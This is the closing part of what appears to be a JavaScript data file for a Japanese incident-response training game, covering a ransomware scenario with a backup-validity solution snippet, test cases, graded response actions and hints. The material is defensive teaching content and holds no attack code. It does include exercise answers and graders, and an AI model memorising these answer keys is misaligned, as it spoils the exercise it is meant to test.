      solutionCode: 'const beforeInfection = backup.takenAt < infectionStart;\n\nif (backup.exists && beforeInfection && backup.scanClean && backup.isolatedCopy) {\n  return true;\n} else {\n  return false;\n}',
      testCases: [
        { name: "B1（侵入前・隔離・検査済み）", input: { backup: { exists: true, takenAt: 1320, scanClean: true, isolatedCopy: true }, infectionStart: 1380 }, expected: true },
        { name: "B2（侵入後・共有フォルダ）", input: { backup: { exists: true, takenAt: 1440, scanClean: false, isolatedCopy: false }, infectionStart: 1380 }, expected: false },
        { name: "侵入前だが共有フォルダ", input: { backup: { exists: true, takenAt: 1200, scanClean: true, isolatedCopy: false }, infectionStart: 1380 }, expected: false },
        { name: "侵入前・隔離だが未検査", input: { backup: { exists: true, takenAt: 1200, scanClean: false, isolatedCopy: true }, infectionStart: 1380 }, expected: false },
      ],
      responseActions: [
        { id: "a1", label: "感染したサーバーと同じネットワークの機械を隔離する（電源は切らない）", effect: "good", urgent: true, feedback: "広がりを止めつつ、メモリなどの手がかりを残します。" },
        { id: "a2", label: "ログとディスクの複製を保全する", effect: "good", urgent: true, feedback: "侵入経路と盗まれた範囲を調べる材料です。" },
        { id: "a3", label: "退職者アカウント admin_old を無効化し、VPNの全アカウントを棚卸しする", effect: "good", urgent: true, feedback: "侵入口をふさがないと、復旧後に再び侵入されます。" },
        { id: "a4", label: "B1 から重要システムを段階的に復旧し、各段階で監視する", effect: "good", feedback: "出荷に必要な機能から順に、安全を確かめて戻します。" },
        { id: "a5", label: "6時の出荷に間に合わせるため、身代金を支払う", effect: "bad", feedback: "復号の保証はなく、データ公開の脅しも止まるとは限りません。法的な問題も生じえます。" },
        { id: "a6", label: "一番新しい B2 から全システムを一斉に復旧する", effect: "bad", feedback: "侵入後のバックアップで、裏口ごと戻すおそれがあります。" },
      ],
      report: {
        residual: [
          { text: "外部に送信されたデータの範囲を特定し、取引先や関係機関へ報告する", correct: true },
          { text: "退職者アカウントの無効化手順を人事と連携して整える", correct: true },
          { text: "復旧できたので攻撃者のデータ公開の心配はない", correct: false },
        ],
      },
      nova: {
        evidence: "侵入（23:00）・外部送信（01:10）・暗号化（02:00）の時刻と、バックアップの時刻を時系列に並べてみよう。緊急の対応は原因が確定する前でも実行できるよ。",
        code: "『侵入前』『検査済み』『隔離保管』の3つ。暗号化の時刻ではなく侵入の時刻と比べるのがポイント。",
      },
    },
  ]);
})(typeof globalThis !== "undefined" ? globalThis : this);
